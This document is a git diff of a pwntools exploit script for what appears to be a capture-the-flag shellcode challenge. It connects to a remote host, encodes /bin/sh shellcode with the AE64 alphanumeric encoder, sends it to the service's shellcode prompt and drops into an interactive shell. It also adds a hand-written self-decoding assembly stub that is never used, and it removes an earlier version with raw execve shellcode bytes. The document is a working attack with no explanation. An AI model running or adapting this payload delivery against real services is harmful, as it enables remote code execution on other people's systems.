@@ -1,43 +1,108 @@
 #!/usr/bin/env python
 
 from pwn import *
-from pwnlib.asm import asm
+from pwnlib import gdb
+from pwnlib.asm import *
 from pwnlib.context import context
+from ae64 import AE64
 
-# r = remote('111.186.57.85', 30012)
-r = process('./bin/sc2')
+r = remote('111.186.57.85', 30012)
+# r = process('./bin/sc2')
+# gdb.attach(r)
+
 
 context.os = 'linux'
 context.arch = 'amd64'
+context.log_level = 'debug'
 
-r.recvline()
-r.recvline()
+payload_asm = """
+    push %rdx
+    push %rdx
+    push %rdx
+    pop %rax
 
-raw_asm = """
-    xor rcx, rcx
+prepare_ff:        
+  push $0x30                
+  push %rsp                
+  pop %rcx              
+  pop %rax            
+  xor $0x35, %al           
+  push %rax                
+  imul $0x33, (%rcx), %esi
+
+prepare_f8:  
+  push %rsi             
+  pop %rax               
+
+  xor $0x30, %al       
+  xor $0x37, %al        
+
+write_negative_8:     
+  xor 0x74(%rcx), %eax     
+  xor %eax, 0x74(%rcx)   
+
+  xor %esi, 0x75(%rcx) 
+  xor %esi, 0x76(%rcx) 
+  xor %esi, 0x77(%rcx) 
+read_negative_8:    
+  movslq 0x74(%rcx), %rdi
+
+get_return_pointer:        
+  xor %esi, (%rcx, %rdi, 2) 
+  xor (%rcx, %rdi, 2), %rsi 
+
+prepare_key:       
+  push $0x5658356a        
+  pop %rax           
+
+decode_encoded_code:   
+  xor %eax, 0x4b(%rsi)   
+
+decode_encoded_data:      
+  xor %eax, 0x53(%rsi)     
+  xor 0x4f(%rsi), %rax      
+
+begin_stack_setup:     
+  push %rax                 
+  push %rsp                 
+  
+
+zero_rax:          
+  push $0x30               
+  pop %rax               
+  xor $0x30, %al
+
+end_stack_setup:
+  push %rax
+  push %rax
+
+
+mov_3b_al:
+  xor $0x75, %al
+  xor $0x4e, %al
+begin_stack_run:
+  pop %rdx
+encoded_code:
+  .byte 0x34
+  .byte 0x6a
+  .byte 0x57
+  .byte 0x53
+encoded_data:
+  .byte 0x45
+  .byte 0x57
+  .byte 0x31
+  .byte 0x38
+  .byte 0x45
+  .byte 0x46
+  .byte 0x30
+  .byte 0x56
 """
 
-group_size = 8
+obj = AE64()
+payload = obj.encode(asm(shellcraft.sh()), 'rdx')
 
-target_shellcodes = b"\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
 
-if tail := len(target_shellcodes) % group_size:
-    target_shellcodes += b'\x48' * (group_size - tail)
+r.recvuntil('Input your shellcode:')
+r.send(payload)
 
-# reverse all codes, since that's how stack works
-target_shellcodes = target_shellcodes[::-1]
-
-code_chunks = [target_shellcodes[i:i + group_size]
-               for i in range(0, len(target_shellcodes), group_size)]
-
-magic_numbers = []
-for qword in code_chunks:
-    buf = []
-    for byte in qword:
-        buf.append(hex(byte)[2:])
-    magic_numbers.append(int(''.join(buf), base=16))
-
-print(asm(raw_asm))
-gen_code = asm(raw_asm).ljust(0x1000, b'8')
-r.sendline(gen_code)
 r.interactive()
